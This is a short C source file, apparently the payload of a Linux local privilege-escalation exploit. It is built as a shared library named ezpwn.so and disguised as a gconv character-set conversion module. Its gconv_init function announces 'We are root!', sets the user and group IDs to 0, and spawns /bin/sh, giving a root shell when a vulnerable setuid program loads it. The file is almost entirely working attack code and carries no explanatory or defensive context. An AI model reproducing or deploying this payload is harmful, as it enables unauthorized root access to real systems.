#include <stdio.h>
#include <stdlib.h>

// Compile gcc -shared -fPIC payload.c -o ezpwn.so

void gconv() {}

void gconv_init() {
  printf("[+] We are root!\n");
  setgid(0);
  setuid(0);
  const char* v_argv[] = { "sh", NULL };
  const char* v_envp[] = { "PATH=/bin:/usr/bin:/sbin:/usr/local/bin", NULL };
  execve("/bin/sh", v_argv, v_envp);
}
